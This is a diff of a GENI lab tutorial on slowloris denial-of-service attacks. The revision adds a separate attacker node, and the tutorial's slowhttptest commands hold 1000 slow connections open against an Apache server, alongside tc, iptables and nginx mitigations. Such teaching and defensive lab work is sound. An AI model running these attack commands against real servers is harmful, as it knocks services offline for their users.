@@ -44,11 +44,11 @@ Finally, we found that the nginx web server is resistant to slowloris (even with
 
 ## Run my experiment
 
-In the GENI Portal, create a new slice, and load the [RSpec](https://gist.github.com/ffund/b9b69d4a118d009761a7aca664f0324a) from the following URL: [https://git.io/v9ftJ](https://git.io/v9ftJ)
+In the GENI Portal, create a new slice, and load the [RSpec](https://gist.github.com/ffund/b9b69d4a118d009761a7aca664f0324a) from the following URL: [https://git.io/JvPup](https://git.io/JvPup)
 
-This will load a topology with two nodes connected by a link, like this:
+This will load a topology with three nodes connected by a link, like this:
 
-![](/blog/content/images/2016/03/slowloris.png)
+![](/blog/content/images/2020/03/slowloris-1.png)
 
 Click on "Site 1" and choose an InstaGENI aggregate, then reserve these resources.
 
@@ -59,16 +59,10 @@ sudo apt-get update
 sudo apt-get -y install lynx-cur apache2
 ```
 
-to install the Apache web server (and Lynx, a text-based web browser for use in terminal sessions). Verify that the web server is running by connecting to it from a browser; run
-
-```
-lynx http://server
-```
-
-on the server node and you should see the Apache2 Ubuntu Default Page.
+to install the Apache web server (and Lynx, a text-based web browser for use in terminal sessions). 
 
 
-In a second terminal, SSH into the client node and run
+In a second terminal, SSH into the attacker node and run
 
 ```
 sudo apt-get update
@@ -77,7 +71,22 @@ sudo apt-get -y install slowhttptest
 
 to install the [slowhttptest](https://github.com/shekyan/slowhttptest/wiki) tool. This tool implements several Layer 7 DoS attacks, including slowloris.
 
-Then, on the client, run
+On a third terminal, SSH into the client node, and run
+
+```
+sudo apt update
+sudo apt-get -y install lynx
+```
+
+Verify that the web server is running by connecting to it from a browser; run
+
+```
+lynx http://server
+```
+
+on the client node and you should see the Apache2 Ubuntu Default Page.
+
+Then, on the attacker, run
 
 ```
 slowhttptest -c 1000 -H -g -o apache_no_mitigation -i 10 -r 200 -t GET -u http://server -x 24 -p 3 -l 120
@@ -107,7 +116,7 @@ service available:   NO
 
 means that the DoS attack on the web server was successful.
 
-This test will run for 120 seconds. After about half a minute, while the test is still running, try to access the web page again on the server node by running
+This test will run for 120 seconds. After about half a minute, while the test is still running, try to access the web page again on the client node by running
 
 ```
 lynx http://server
@@ -131,34 +140,34 @@ After the test finishes running, transfer the "apache\_no\_mitigation.html" to y
 
 Let us explore several ways to mitigate this kind of attack. 
 
-First, let's see if this attack is still feasible when the client has very limited bandwidth. On the client node, run
+First, let's see if this attack is still feasible when the attacker has very limited bandwidth. On the attacker node, run
 
 ```
 ifconfig
 ```
 
-and find the name of the network interface that is connected to the server. Then, run
+and find the name of the network interface that is connected to the server (the one with IP address 10.10.1.3). Then, run
 
-```
-sudo tc qdisc replace dev eth1 root netem rate 100kbit
-```
+<pre>
+sudo tc qdisc replace dev <b>eth1</b> root netem rate 100kbit
+</pre>
 
-substituting the name of the interface you have found in the previous step for eth1. This will limit the rate of outgoing traffic on this interface to 100 kbps.
+substituting the name of the interface you have found in the previous step for **eth1**. This will limit the rate of outgoing traffic on this interface to 100 kbps.
 
-Now we'll run the slowloris attack again. On the client, run
+Now we'll run the slowloris attack again. On the attacker, run
 
 ```
 slowhttptest -c 1000 -H -g -o apache_lowrate_client -i 10 -r 200 -t GET -u http://server -x 24 -p 3 -l 120
 ```
 
-Wait about 30 seconds and then check the service availability by running lynx again on the server. When the test finishes (after 120 seconds), transfer the "apache\_lowrate\_client.html" file to your laptop with SCP and open it in a browser. Open this file with a web browser. You should see an image similar to the second one in the [Results](#results) section, indicating that even when the attacker has very little available bandwidth, the attack can still be successful.
+Wait about 30 seconds and then check the service availability by running lynx again on the client. When the test finishes (after 120 seconds), transfer the "apache\_lowrate\_client.html" file to your laptop with SCP and open it in a browser. Open this file with a web browser. You should see an image similar to the second one in the [Results](#results) section, indicating that even when the attacker has very little available bandwidth, the attack can still be successful.
 
 
 Remove the rate limiting traffic shaper on the client with
 
-```
-sudo tc qdisc delete dev eth1 root
-```
+<pre>
+sudo tc qdisc delete dev <b>eth1</b> root
+</pre>
 
 substituting the correct interface name in the command above. 
 
@@ -172,7 +181,7 @@ sudo iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --con
 
 to set up this rule.
 
-On the client, run
+On the attacker, run
 
 ```
 slowhttptest -c 1000 -H -g -o apache_iptables -i 10 -r 200 -t GET -u http://server -x 24 -p 3 -l 120
@@ -184,17 +193,17 @@ and then, after half a minute, run
 lynx http://server
 ```
 
-on the server to check the availability of the service. Even when slowhttptest reports
+on the client to check the availability of the service. Even when slowhttptest reports
 
 ```
 service available:   NO
 ```
 
-we can still load the page in lynx on the server:
+we can still load the page in lynx on the client:
 
 ![](/blog/content/images/2017/04/slowloris-ok.png)
 
-This is because the service is only unavailable to the malicious user. The firewall does not affect a non-malicious user.
+This is because the service is only unavailable to the malicious user. The firewall does not affect a non-malicious user with fewer connections.
 
 Transfer the file "apache\_iptables.html" to your laptop with SCP and open it in a browser. Compare it to the third figure in the [Results](#results) section.
 
@@ -229,7 +238,7 @@ sudo apt-get -y install nginx
 sudo service nginx restart
 ```
 
-Run the attack from the client again, with
+Run the attack from the attacker again, with
 
 ```
 slowhttptest -c 1000 -H -g -o nginx_no_mitigation -i 10 -r 200 -t GET -u http://server -x 24 -p 3 -l 120  
@@ -241,7 +250,7 @@ and after 30 seconds, run
 lynx http://server
 ```
 
-on the server. Here, you should see a "Welcome to nginx" page:
+on the client. Here, you should see a "Welcome to nginx" page:
 
 ![](/blog/content/images/2017/04/slowloris-nginx.png)
 
